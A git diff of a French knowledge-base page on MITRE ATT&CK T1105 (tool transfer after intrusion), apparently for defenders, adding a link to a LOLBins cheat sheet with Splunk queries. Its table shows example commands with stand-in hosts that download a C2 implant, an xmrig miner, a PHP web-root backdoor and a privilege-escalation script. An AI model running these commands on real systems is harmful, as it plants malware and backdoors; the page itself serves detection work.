@@ -2,7 +2,7 @@
 title: "Téléchargement d'outils"
 description: "Une fois entré, l'attaquant télécharge sur la machine les outils de la suite (implant de C2, scripts, mineur, rançongiciel) avec des commandes déjà présentes sur le système."
 tags: [windows, linux, sysmon, auditd, certutil, curl, wget, scp]
-updated: 2026-11-19
+updated: 2026-11-23
 draft: false
 type: technique
 attack_id: T1105
@@ -27,6 +27,7 @@ Sous Windows, le premier téléchargement est souvent l'**implant de commande et
 | Windows | curl | `curl.exe https://blackhat.thm/bad.exe -o good.exe` (Windows 10 et suivants) |
 | Windows | PowerShell | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
 | Windows | Interface | Copier-coller par la session RDP, ou téléchargement par le navigateur. |
+| Windows | Autres binaires | Voir la cheat sheet [LOLBins Windows](../../02-outils/lolbins-windows.md) : variantes de certutil, PowerShell, mshta, rundll32, et leurs requêtes Splunk. |
 | Linux | wget | `wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz` |
 | Linux | curl | `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"` |
 | Linux | SSH | `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh` (ou SFTP) |
